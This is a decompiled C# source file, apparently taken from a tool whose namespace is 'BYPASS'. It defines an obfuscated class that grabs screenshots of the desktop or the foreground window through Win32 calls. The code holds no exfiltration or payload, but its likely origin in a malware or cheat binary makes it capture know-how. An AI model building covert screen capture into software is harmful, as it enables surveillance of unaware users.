using System;
using System.Drawing;
using System.Runtime.InteropServices;

namespace BYPASS
{
	// Token: 0x0200003F RID: 63
	public class ScrnCt
	{
		// Token: 0x06000130 RID: 304
		[DllImport("User32.dll")]
		private static extern IntPtr GetForegroundWindow();

		// Token: 0x06000131 RID: 305
		[DllImport("User32.dll")]
		private static extern IntPtr GetWindowRect(IntPtr intptr_0, ref ScrnCt.Struct7 jsvf159BhxmtonhA68v_0);

		// Token: 0x06000132 RID: 306
		[DllImport("User32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		public static extern IntPtr GetDesktopWindow();

		// Token: 0x06000133 RID: 307 RVA: 0x00002922 File Offset: 0x00000B22
		public static Image CaptureDesktop()
		{
			return ScrnCt.CaptureWindow(ScrnCt.GetDesktopWindow());
		}

		// Token: 0x06000134 RID: 308 RVA: 0x0000292E File Offset: 0x00000B2E
		public static Bitmap CaptureActiveWindow()
		{
			return ScrnCt.CaptureWindow(ScrnCt.GetForegroundWindow());
		}

		// Token: 0x06000135 RID: 309 RVA: 0x0000ABBC File Offset: 0x00008DBC
		public static Bitmap CaptureWindow(IntPtr handle)
		{
			ScrnCt.Struct7 @struct = default(ScrnCt.Struct7);
			ScrnCt.GetWindowRect(handle, ref @struct);
			Rectangle rectangle = new Rectangle(@struct.int_0, @struct.int_1, @struct.int_2 - @struct.int_0, @struct.int_3 - @struct.int_1);
			Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				graphics.CopyFromScreen(new Point(rectangle.Left, rectangle.Top), Point.Empty, rectangle.Size);
			}
			return bitmap;
		}

		// Token: 0x02000040 RID: 64
		private struct Struct7
		{
			// Token: 0x0400010C RID: 268
			public int int_0;

			// Token: 0x0400010D RID: 269
			public int int_1;

			// Token: 0x0400010E RID: 270
			public int int_2;

			// Token: 0x0400010F RID: 271
			public int int_3;
		}
	}
}
